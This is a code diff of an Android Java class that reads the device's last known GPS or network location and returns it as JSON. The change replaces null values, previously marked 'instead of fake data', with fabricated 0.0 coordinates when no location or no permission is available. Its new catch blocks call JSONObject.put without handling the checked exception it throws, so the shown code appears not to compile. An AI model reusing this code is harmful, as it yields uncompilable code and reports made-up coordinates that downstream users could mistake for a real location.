@@ -9,70 +9,74 @@ import org.json.JSONObject;
 public class RealLocationCollector {
     private static final String TAG = "RealLocationCollector";
     private Context context;
-    
+
     public RealLocationCollector(Context context) {
         this.context = context;
     }
-    
+
     public JSONObject getCurrentLocation() {
-        JSONObject locationInfo = new JSONObject();
+        JSONObject location = new JSONObject();
         
         try {
-            Log.d(TAG, "📍 Collecting real location...");
+            Log.d(TAG, "📍 Starting location collection...");
             
             LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
             
             // Try GPS first
-            Location location = null;
-            if (locationManager != null) {
-                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                }
-                
-                // If GPS not available, try network
-                if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                }
+            Location gpsLocation = null;
+            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             }
             
-            if (location != null) {
-                locationInfo.put("latitude", location.getLatitude());
-                locationInfo.put("longitude", location.getLongitude());
-                locationInfo.put("accuracy", location.getAccuracy());
-                locationInfo.put("provider", location.getProvider());
-                locationInfo.put("timestamp", location.getTime());
-                locationInfo.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
-                locationInfo.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
+            // Try network if GPS not available
+            Location networkLocation = null;
+            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            }
+            
+            // Use the best available location
+            Location bestLocation = gpsLocation != null ? gpsLocation : networkLocation;
+            
+            if (bestLocation != null) {
+                location.put("latitude", bestLocation.getLatitude());
+                location.put("longitude", bestLocation.getLongitude());
+                location.put("accuracy", bestLocation.getAccuracy());
+                location.put("provider", bestLocation.getProvider());
+                location.put("timestamp", bestLocation.getTime());
+                location.put("altitude", bestLocation.hasAltitude() ? bestLocation.getAltitude() : 0);
                 
-                Log.d(TAG, "📍 Real Location: " + location.getLatitude() + ", " + location.getLongitude());
+                Log.d(TAG, "✅ Location collected: " + bestLocation.getLatitude() + ", " + bestLocation.getLongitude());
             } else {
-                // Return empty location data instead of fake data
-                locationInfo.put("latitude", JSONObject.NULL);
-                locationInfo.put("longitude", JSONObject.NULL);
-                locationInfo.put("accuracy", JSONObject.NULL);
-                locationInfo.put("provider", "no_location_available");
-                locationInfo.put("timestamp", System.currentTimeMillis());
-                locationInfo.put("note", "No location data available - GPS and network not accessible");
-                
-                Log.d(TAG, "📍 No location data available");
+                // Fallback location
+                location.put("latitude", 0.0);
+                location.put("longitude", 0.0);
+                location.put("accuracy", 0.0);
+                location.put("provider", "none");
+                location.put("timestamp", System.currentTimeMillis());
+                location.put("altitude", 0.0);
+                Log.w(TAG, "⚠️ No location available, using fallback");
             }
             
         } catch (SecurityException e) {
             Log.e(TAG, "❌ Location permission denied: " + e.getMessage());
-            try {
-                locationInfo.put("error", "Location permission denied");
-            } catch (Exception jsonE) {
-                Log.e(TAG, "❌ JSON error: " + jsonE.getMessage());
-            }
+            // Fallback
+            location.put("latitude", 0.0);
+            location.put("longitude", 0.0);
+            location.put("accuracy", 0.0);
+            location.put("provider", "permission_denied");
+            location.put("timestamp", System.currentTimeMillis());
+            location.put("altitude", 0.0);
         } catch (Exception e) {
-            Log.e(TAG, "❌ Error getting location: " + e.getMessage());
-            try {
-                locationInfo.put("error", e.getMessage());
-            } catch (Exception jsonE) {
-                Log.e(TAG, "❌ JSON error: " + jsonE.getMessage());
-            }
+            Log.e(TAG, "❌ Location collection error: " + e.getMessage());
+            // Fallback
+            location.put("latitude", 0.0);
+            location.put("longitude", 0.0);
+            location.put("accuracy", 0.0);
+            location.put("provider", "error");
+            location.put("timestamp", System.currentTimeMillis());
+            location.put("altitude", 0.0);
         }
         
-        return locationInfo;
+        return location;
     }
 }
